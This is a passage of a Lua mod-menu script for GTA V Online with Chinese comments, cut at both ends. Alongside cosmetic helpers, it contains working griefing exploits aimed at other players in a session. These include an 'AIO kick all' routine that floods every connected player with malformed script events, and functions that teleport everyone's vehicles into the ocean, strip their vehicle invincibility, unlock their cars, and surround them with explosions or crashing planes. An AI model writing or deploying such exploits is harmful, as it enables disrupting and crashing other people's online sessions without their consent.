		ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0, -0.18, 0, 180, 220, 0, false, true, false, false, 1, true)
	end
end
--炸弹雨
active_bowling_balls = 0
function bomb_shower_tick_handler(ent)
    local start_time = os.clock()
    active_bowling_balls += 1
    util.create_tick_handler(function()
        if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(ent) or os.clock() - start_time > 10 or not ENTITY.DOES_ENTITY_EXIST(ent) then
            if ENTITY.DOES_ENTITY_EXIST(ent) then 
                local c = ENTITY.GET_ENTITY_COORDS(ent)
                FIRE.ADD_EXPLOSION(c.x, c.y, c.z, 17, 100.0, true, false, 0.0)
                entities.delete_by_handle(ent)
            end
            if active_bowling_balls > 0 then 
                active_bowling_balls -= 1
            end
            util.stop_thread()
        end
    end)
end
--实体信息
function to_rgb(r, g, b, a)
    local color = {}
    color.r = r
    color.g = g
    color.b = b
    color.a = a
    return color
end
--彩屏
function xcpm(on)
    local a_toggle = menu.ref_by_path('World>Aesthetic Light>Aesthetic Light')
    if on then 
        menu.trigger_commands("shader glasses_purple")
        menu.trigger_commands("aestheticcolourred 255")
        menu.trigger_commands("aestheticcolourgreen 0")
        menu.trigger_commands("aestheticcolourblue 255")
        menu.trigger_commands("aestheticrange 10000")
        menu.trigger_commands("aestheticintensity 30")
        menu.trigger_commands("time 0")
        menu.set_value(a_toggle, true)
    else
        menu.set_value(a_toggle, false)
        menu.trigger_commands("shader off")
    end
end
--加入战局时向玩家敬酒
local join_ing = false
function CheckLobbyForPlayers()
    local buffer = join_ing
    join_ing = NETWORK.NETWORK_IS_SESSION_STARTED()
    wait(2000)
    local playersTable = players.list()
    if buffer ~= join_ing then
        for i = 1, 100 do
            util.toast("战局中的玩家: " .. #playersTable)
            wait(10)
        end
    end
end
--将所有人传送到海洋
VehTeleportLoadIterations = 20
function TeleportEveryonesVehicleToOcean()
    local oldcoords = getEntityCoords(GetLocalPed())
    for i = 0, 31 do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            local ped = getPlayerPed(i)
            local pedCoords = getEntityCoords(ped)
            for c = 0, VehTeleportLoadIterations do --teleports us to them so we load their veh
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(GetLocalPed(), pedCoords.x, pedCoords.y, pedCoords.z + 10, false, false, false)
                wait(100)
            end
            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
                for a = 0, 10 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, 4500, -4400, 4, false, false, false)
                    wait(100)
                end
                for b = 0, 10 do
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, 4500, -4400, 4, false, false, false)
                end
            end
        end
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(GetLocalPed(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
end
--移除所有人的载具无敌
function RemoveVehicleGodmodeForAll()
    for i = 0, 31 do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            local ped = getPlayerPed(i)
            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
                ENTITY.SET_ENTITY_CAN_BE_DAMAGED(veh, true)
                ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
            end
        end
    end
end
--AIO全局踢
TXC_SLOW = false
function AIOKickAll()
    menu.trigger_commands("scripthost")
    NETWORK.NETWORK_REQUEST_TO_BE_HOST_OF_THIS_SCRIPT()
    for i = 0, 31 do
        if i ~= players.user() and NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            util.toast("玩家已连接 " .. tostring(PLAYER.GET_PLAYER_NAME(i) .. ", 开始 AIO."))
            util.trigger_script_event(1 << i, {0x37437C28, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-1308840134, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x4E0350C6, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x114C63AC, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x15F5B1D4, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x249FE11B, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x76B11968, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x9C050EC, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x3B873479, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x23F74138, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            --[[
            util.trigger_script_event(1 << i, {0xAD63290E, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            ]]
            --[[
            util.trigger_script_event(1 << i, {0x39624029, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            ]]
            util.trigger_script_event(1 << i, {-0x529CD6F2, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x756DBC8A, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x69532BA0, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x68C5399F, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x7DE8CAC0, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x285DDF33, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x177132B8, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10)
            --util.toast("主程序块完成. // AIO")
            util.trigger_script_event(1 << i, {memory.script_global(1893548 + (1 + (i * 600) + 511)), i})
            for a = -1, 1 do
                for n = -1, 1 do
                    util.trigger_script_event(1 << i, {-65587051, 28, a, n})
                    wait(10)
                end
            end
            --util.toast("第二块完成. // AIO")
            for a = -1, 1 do
                for n = -1, 1 do
                    util.trigger_script_event(1 << i, {1445703181, 28, a, n})
                    wait(10)
                end
            end
            --util.toast("第三块完成. // AIO")
            if TXC_SLOW then
                wait(10)
                util.trigger_script_event(1 << i, {-290218924, -32190, -71399, 19031, 85474, 4468, -2112})
                wait(10)
                util.trigger_script_event(1 << i, {-227800145, -1000000, -10000000, -100000000, -100000000, -100000000})
                wait(10)
                util.trigger_script_event(1 << i, {2002459655, -1000000, -10000, -100000000})
                wait(10)
                util.trigger_script_event(1 << i, {911179316, -38, -30, -75, -59, 85, 82})
                wait(10)
                --[[
                for n = -10, -7 do
                    for a = -60, 60 do
                        util.trigger_script_event(1 << i, {0x39624029, n, 623656, a, 73473741, -7, 856844, -51251, 856844})
                        wait(10)
                    end
                end
                ]]
                util.trigger_script_event(1 << i, {-290218924, -32190, -71399, 19031, 85474, 4468, -2112})
                wait(10)
                util.trigger_script_event(1 << i, {-1386010354, 91645, -99683, 1788, 60877, 55085, 72028})
                wait(10)
                util.trigger_script_event(1 << i, {-227800145, -1000000, -10000000, -100000000, -100000000, -100000000})
                wait(10)
                for g = -28, 0 do
                    for n = -1, 1 do
                        for a = -1, 1 do
                            util.trigger_script_event(1 << i, {1445703181, i, n, a})
                        end
                    end
                    wait(10)
                end
                --[[for a = -28, 20 do
                    for n = -10, 2 do
                        for b = -100, 100 do
                            util.trigger_script_event(1 << i, {-1782442696, b, n, a})
                            util.log("第六块,加载 " .. b)
                        end
                        util.log("第七块,加载 " .. n)
                    end
                    util.log("第八块,加载 " .. a)
                    wait(10)
                end]]
                for a = -11, 11 do
                    util.trigger_script_event(1 << i, {2002459655, -1000000, a, -100000000})
                end
                for a = -10, 10 do
                    for n = 30, -30 do
                        util.trigger_script_event(1 << i, {911179316, a, n, -75, -59, 85, 82})
                    end
                end
                for a = -10, 10 do
                    util.trigger_script_event(1 << i, {-65587051, a, -1, -1})
                end
                util.trigger_script_event(1 << i, {951147709, i, 1000000, nil, nil}) 
                for a = -10, 10 do
                    util.trigger_script_event(1 << i, {-1949011582, a, 1518380048})
                end
                for a = -10, 4 do
                    for n = -10, 5 do
                        util.trigger_script_event(1 << i, {1445703181, 28, a, n})
                    end
                end
            end
            util.toast("第四块完成. // AIO")
            util.toast("循环 " .. i .. " 完成AIO踢出.")
            util.toast("玩家 " .. PLAYER.GET_PLAYER_NAME(i) .. " 已完成.")
        end
    end
    wait(100)
end

--踢出
function KickPlayer(PlayerID, method)
    local path = menu.player_root(PlayerID)
    local command = menu.ref_by_rel_path(path, "Kick>"..method)
    menu.trigger_command(command)
end
--传送枪
function write_vector3(address, vector)
	memory.write_float(address + 0x0, vector.x)
	memory.write_float(address + 0x4, vector.y)
	memory.write_float(address + 0x8, vector.z)
end

function set_entity_coords(entity, coords)
	local fwEntity = entities.handle_to_pointer(entity)
	local CNavigation = memory.read_long(fwEntity + 0x30)
	if CNavigation ~= 0 then
		write_vector3(CNavigation + 0x50, coords)
		write_vector3(fwEntity + 0x90, coords)
	end
end
--将载具放在玩家身上
function DropVehicleOnPlayer(pid, name, invis)
    local ped = getPlayerPed(pid)
    local pc = getEntityCoords(ped)
    local hash = joaat(name)
    requestModel(hash)
    while not hasModelLoaded(hash) do wait() end
    local ourveh = VEHICLE.CREATE_VEHICLE(hash, pc.x, pc.y, pc.z + 5, 0, true, true, false)
    if invis then
        ENTITY.SET_ENTITY_VISIBLE(ourveh, false, 0)
    end
    noNeedModel(hash)
    wait(1200)
    entities.delete_by_handle(ourveh)
end
--伪造载具
function FakeLagPlayerVehicle(pid)
    local ped = getPlayerPed(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(ped) then
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        local velocity = ENTITY.GET_ENTITY_VELOCITY(veh)
        local oldcoords = getEntityCoords(ped)
        wait(500)
        local nowcoords = getEntityCoords(ped)
        for a = 1, 10 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            wait()
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
        wait(200)
        for b = 1, 10 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            wait()
        end
        ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
        for c = 1, 10 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            wait()
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, nowcoords.x, nowcoords.y, nowcoords.z, false, false, false)
        for d = 1, 10 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            wait()
        end
        ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
        wait(500)
    else
        util.toast("玩家 " .. GetPlayerName_pid(pid) .. " 不在载具内!")
    end
end
--实体枪
function makeListForEntity(parent, entityHandle)
    return menu.list(parent, GetEntityTypeString(entityHandle) .. " | 移动: " .. entityHandle, {}, "")
end
function GetEntityTypeString(handle)
    local t = ENTITY.GET_ENTITY_TYPE(handle)
    if (t == 1) then return "Ped" elseif (t == 2) then return "载具" elseif (t == 3) then return "物体" else return nil end
end
function funcsForEntity(handleTable, intMenuList, handle)
    menu.action(intMenuList, "删除列表", {}, "删除实体的文件夹. 如果这个实体消失了,但列表中没有消失,则使用此选项.", function()
        menu.delete(intMenuList)
        local indx = GetValueIndexFromTable(handleTable, handle)
        table.remove(handleTable, indx)
    end)
    menu.action(intMenuList, "删除实体", {}, "", function()
        entities.delete_by_handle(handle)
    end)
    menu.action(intMenuList, "请求控制", {}, "请求控制实体.", function()
        for i = 1, 10 do 
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(handle)
            wait()
        end
        if (NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(handle)) then util.toast("拥有控制权.") else util.toast("无法控制!") end
    end)
    menu.action(intMenuList, "传送到我", {}, "将实体传送给你.", function()
        local mypos = getEntityCoords(GetLocalPed())
        ENTITY.SET_ENTITY_COORDS(handle, mypos.x, mypos.y, mypos.z, false, false, false, false)
    end)
    menu.action(intMenuList, "附加到我自己", {}, "将实体附加到您身上,没有碰撞. 更多选择可能会晚些时候!", function()
        ENTITY.ATTACH_ENTITY_TO_ENTITY(handle, GetLocalPed(), -1, 0, 0, 0, 0, 0, 0, true, true, false, false, 0, true, true)
    end)
    menu.action(intMenuList, "传送到随机玩家", {}, "将实体传送给随机玩家.", function()
        local plist = players.list(false, true, true)
        local randomIndex = math.random(1, #plist)

        local randomPID = plist[randomIndex]
        local pos = getEntityCoords(getPlayerPed(randomPID))
        ENTITY.SET_ENTITY_COORDS(handle, pos.x, pos.y, pos.z, false, false, false, false)
        util.toast("传送到 PID: " .. randomPID .. " || 名字: " .. GetPlayerName_pid(randomPID))
    end)
    menu.action(intMenuList, "向任意方向发射", {}, "以随机方向发射实体.", function()
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(handle, 1,
            math.random(100, 2000), math.random(100, 2000), math.random(100, 2000),
            true, false, true)
    end)
end
function doesEntityExist(handleTable, intMenuList, handle)
    if (not ENTITY.DOES_ENTITY_EXIST(handle)) then
        local indx = GetValueIndexFromTable(handleTable, handle)
        table.remove(handleTable, indx)
        menu.delete(intMenuList)
        return false
    end
    wait(500)
end
--载具颠倒
function UpsideDownVehicleRotationWithKeys()
    local veh = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
    local vv = ENTITY.GET_ENTITY_ROTATION(veh, 2)
    --Pitch: X || Roll: y || Yaw: z
    local vvPitch = v3.getX(vv)
    local vvRoll = v3.getY(vv)
    local vvYaw = v3.getZ(vv)
    ENTITY.SET_ENTITY_ROTATION(veh, 10, 179.5, vvYaw, 2, true)
    --rotation logic (left-right || YAW)
    if PAD.IS_CONTROL_PRESSED(0, 63) then --63 || INPUT_VEH_MOVE_LEFT_ONLY || A
            local yawAfterPress = vvYaw + 3
            if yawAfterPress > 180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw)*-1 --negative bypass overflow
                local toSetYaw = overFlowNeg + 3
                ENTITY.SET_ENTITY_ROTATION(veh, 10 --[[10]], 179.5, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, 10 --[[10]], 179.5, yawAfterPress, 2, true)
            end
    end
    if PAD.IS_CONTROL_PRESSED(0, 64) then --64 ||INPUT_VEH_MOVE_RIGHT_ONLY || D
            local yawAfterPress = vvYaw - 3
            if yawAfterPress < -180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw) --positive bypass overflow
                local toSetYaw = overFlowNeg - 3
                ENTITY.SET_ENTITY_ROTATION(veh, 10 --[[10]], 179.5, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, 10 --[[10]], 179.5, yawAfterPress, 2, true)
            end
    end
    if PAD.IS_CONTROL_PRESSED(0, 62) then --62 || INPUT_VEH_MOVE_DOWN_ONLY || LEFT CTRL / NUM5 (NOSE UP)
        local pitchAfterPress = vvPitch + 5
        if pitchAfterPress > 90 then --check for overflow
            --if pitch = 89, we add 3, we will get 88 for pitch. Distance to 90, then sub the rest.
            local pitchToSub = 90 - (3 - math.abs(90 - vvPitch))
            ENTITY.SET_ENTITY_ROTATION(veh, pitchToSub, 179.9, vvYaw)
        else
            --if not overflowed, then we just add.
            ENTITY.SET_ENTITY_ROTATION(veh, pitchAfterPress, 179.9, vvYaw)
        end
    end
    v3.free(vv)
end
--解锁你试图进入的载具
function UnlockVehicleGetIn()
    ::start::
    local localPed = GetLocalPed()
    local veh = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(localPed)
    if PED.IS_PED_IN_ANY_VEHICLE(localPed, false) then
        local v = PED.GET_VEHICLE_PED_IS_IN(localPed, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED(v, 1)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(v, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(v, players.user(), false)
        wait()
    else
        if veh ~= 0 then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
                for i = 1, 20 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    wait(100)
                end
            end
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
                util.toast("等待2秒,无法控制!")
                goto start
            else
                if SE_Notifications then
                    util.toast("拥有控制权.")
                end
            end
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(veh, 1)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(veh, false)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(veh, players.user(), false)
            VEHICLE.SET_VEHICLE_HAS_BEEN_OWNED_BY_PLAYER(veh, false)
        end
    end
end
--解锁你射击的载具
function UnlockVehicleShoot()
    ::start::
    local localPed = GetLocalPed()
    if PED.IS_PED_SHOOTING(localPed) then
        local pointer = memory.alloc(4)
        local isEntFound = PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), pointer)
        if isEntFound then
            local entity = memory.read_int(pointer)
            if ENTITY.IS_ENTITY_A_PED(entity) and PED.IS_PED_IN_ANY_VEHICLE(entity) then
                local vehicle = PED.GET_VEHICLE_PED_IS_IN(entity)
                ---------------------------------------------
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
                    for i = 1, 20 do
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
                        wait(100)
                    end
                end
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
                    util.toast("Waited 2 secs, couldn't get control!")
                    goto start
                else
                    util.toast("拥有控制权.")
                end
                VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)
                VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
                VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(vehicle, players.user(), false)
            elseif ENTITY.IS_ENTITY_A_VEHICLE(entity) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
                    for i = 1, 20 do
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
                        wait(100)
                    end
                end
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
                    util.toast("等待2秒,无法控制!")
                    memory.free(pointer)
                    goto start
                else
                    if SE_Notifications then
                        util.toast("拥有控制权.")
                    end
                end
                VEHICLE.SET_VEHICLE_DOORS_LOCKED(entity, 1)
                VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(entity, false)
                VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(entity, players.user(), false)
                VEHICLE.SET_VEHICLE_HAS_BEEN_OWNED_BY_PLAYER(veh, false)
            end
        end
        memory.free(pointer)
    end
end
--载具快速定制转弯
function FastTurnVehicleWithKeys(scale)
    local veh = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
    local vv = ENTITY.GET_ENTITY_ROTATION(veh, 2)
    local velocity = ENTITY.GET_ENTITY_SPEED_VECTOR(veh, true).y
    --Pitch: X || Roll: y || Yaw: z
    local vvPitch = v3.getX(vv)
    local vvRoll = v3.getY(vv)
    local vvYaw = v3.getZ(vv)
    if PAD.IS_CONTROL_PRESSED(0, 63) then --63 || INPUT_VEH_MOVE_LEFT_ONLY || A

        --OLD LOGIC || if velocity > 0 then --if velocity is greater than 0, we do usual turning logic.
        if PAD.IS_CONTROL_PRESSED(0, 71) or velocity > -0.1 then
            local yawAfterPress = vvYaw + scale
            if yawAfterPress > 180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw)*-1 --negative bypass overflow
                local toSetYaw = overFlowNeg + scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end

        elseif PAD.IS_CONTROL_PRESSED(0, 72) or velocity < -0.1 then --if not, then we do opposite turning logic.

            local yawAfterPress = vvYaw - scale
            if yawAfterPress < -180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw) --positive bypass overflow
                local toSetYaw = overFlowNeg - scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end
        end

    end

    if PAD.IS_CONTROL_PRESSED(0, 64) then --64 ||INPUT_VEH_MOVE_RIGHT_ONLY || D

        --OLD LOGIC || if velocity > 0 then --if velocity is greater than 0, we do usual turning logic.
        if PAD.IS_CONTROL_PRESSED(0, 71) or velocity > -0.1 then
        local yawAfterPress = vvYaw - scale
        if yawAfterPress < -180 then -- check for overflow
            local overFlowNeg = math.abs(vvYaw) --positive bypass overflow
            local toSetYaw = overFlowNeg - scale
            ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
        else --if not overflow
            ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
        end

        elseif PAD.IS_CONTROL_PRESSED(0, 72) or velocity < -0.1 then --if not, then we do opposite turning logic.

            local yawAfterPress = vvYaw + scale
            if yawAfterPress > 180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw)*-1 --negative bypass overflow
                local toSetYaw = overFlowNeg + scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end
        end

    end
    v3.free(vv)
end

local function array_remove(t, fnKeep)
    local j, n = 1, #t;
    for i=1,#t do
        if (fnKeep(t, i, j)) then
            -- Move i's kept value to j's position, if it's not already there.
            if (i ~= j) then
                t[j] = t[i];
                t[i] = nil;
            end
            j = j + 1; -- Increment position of where we'll place the next kept value.
        else
            t[i] = nil;
        end
    end

    return t;
end
function spawn_vehicle(hash, coords, dir, maxed, god)
    request_model_load(hash)
    if maxed then	
        set_entity_coords_no_offset_2t1(car, coords)
        ENTITY.SET_ENTITY_HEADING(car, dir)
        if god then
            ENTITY.SET_ENTITY_INVINCIBLE(car, true)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        return car
    else
        local car = create_vehicle_2t1(hash, coords, dir, true, false)
        if god then
            ENTITY.SET_ENTITY_INVINCIBLE(car, true)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        return car
    end
end
--氮气
function request_ptfx_asset(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end
--3D射线
function request_texture_dict_load(dict_name)
    request_time = os.time()
    GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(dict_name, true)
    while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(dict_name) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end
--举手(按x)
function hhandup()
if PAD.IS_CONTROL_PRESSED(1, 323) then
                while not STREAMING.HAS_ANIM_DICT_LOADED("random@mugging3") do
                    STREAMING.REQUEST_ANIM_DICT("random@mugging3")
                    wait(100)
                end
                if not ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3) then
                    WEAPON.SET_CURRENT_PED_WEAPON(PLAYER.PLAYER_PED_ID(), MISC.GET_HASH_KEY("WEAPON_UNARMED"), true)
                    TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3, 3, -1, 51, 0, false, false, false)
                    STREAMING.REMOVE_ANIM_DICT("random@mugging3")
                    PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), true)
                end
            end
            if PAD.IS_CONTROL_RELEASED(1, 323) and ENTITY.IS_ENTITY_PLAYING_ANIM(PLAYER.PLAYER_PED_ID(), "random@mugging3", "handsup_standing_base", 3) then
                TASK.CLEAR_PED_SECONDARY_TASK(PLAYER.PLAYER_PED_ID())
                PED.SET_ENABLE_HANDCUFFS(PLAYER.PLAYER_PED_ID(), false)
            end
end

function plyped()
	return PLAYER.PLAYER_PED_ID()
end

function request_ptfx_asset_firemen(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end

function request_model(hash, timeout)
    local end_time = os.time() + (timeout or 5)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) and end_time >= os.time() do
        wait()
    end
    return STREAMING.HAS_MODEL_LOADED(hash)
end
function play_anim(dict, name, duration)
    ped = PLAYER.PLAYER_PED_ID()
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        STREAMING.REQUEST_ANIM_DICT(dict)
        wait()
    end
    TASK.TASK_PLAY_ANIM(ped, dict, name, 1.0, 1.0, duration, 3, 0.5, false, false, false)
    --TASK_PLAY_ANIM(Ped ped, char* animDictionary, char* animationName, float blendInSpeed, float blendOutSpeed, int duration, int flag, float playbackRate, BOOL lockX, BOOL lockY, BOOL lockZ)
end

        function caidancargun()
        if PED.IS_PED_SHOOTING(players.user_ped()) then
            local entity = get_entity_player_is_aiming_at(players.user())
            if entity ~= NULL and ENTITY.IS_ENTITY_A_VEHICLE(entity) and request_control(entity, 1000) then
                local primary, secundary = get_random_colour(), get_random_colour()
                VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(entity, primary.r, primary.g, primary.b)
                VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(entity, secundary.r, secundary.g, secundary.b)
            end
        end
    end

--鸡巴炮
function diaoshepao(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end
--飞机坠落
 angry_planes = false
 angry_planes_tar = 0
function start_angryplanes_thread()
    util.create_thread(function()
        local v_hashes = {util.joaat('lazer'), util.joaat('jet'), util.joaat('cargoplane'), util.joaat('titan'), util.joaat('luxor'), util.joaat('seabreeze'), util.joaat('vestra'), util.joaat('volatol'), util.joaat('tula'), util.joaat('buzzard'), util.joaat('avenger')}
        if angry_planes_tar == 0 then 
            angry_planes_tar = players.user_ped()
        end
        while true do
            if not angry_planes then 
                util.stop_thread()
            end
            local p_hash = util.joaat('s_m_m_pilot_01')
            local radius = 200
            local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(angry_planes_tar, math.random(-radius, radius), math.random(-radius, radius), math.random(600, 800))
            local pick = v_hashes[math.random(1, #v_hashes)]
            request_model_load(pick)
            local aircraft = entities.create_vehicle(pick, c, math.random(0, 270))
            set_entity_face_entity(aircraft, angry_planes_tar, true)
            VEHICLE.SET_VEHICLE_ENGINE_ON(aircraft, true, true, false)
            VEHICLE.SET_HELI_BLADES_FULL_SPEED(aircraft)
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(aircraft, VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(aircraft)+1000.0)
            VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(aircraft, true, true)
            --local blip = HUD.ADD_BLIP_FOR_ENTITY(aircraft)
            --HUD.SET_BLIP_SPRITE(blip, 90)
            --HUD.SET_BLIP_COLOUR(blip, 75)
            wait(5000)
        end
    end)
end

function player_toggle_loop(root, pid, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
            if not players.exists(pid) then util.stop_thread() end
    callback()
    end)
end
--爆炸圈
function baozhanquan()
for k,v in pairs(players.list(true, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
            explosion_circle(ped, explosion_circle_angle, 25)
        end

        explosion_circle_angle += 0.15
        wait(50)
    end

 function get_closest_veh(coords)
    local closest = nil
    local closest_dist = 1000000
    local this_dist = 0
    for _, veh in pairs(entities.get_all_vehicles_as_handles()) do 
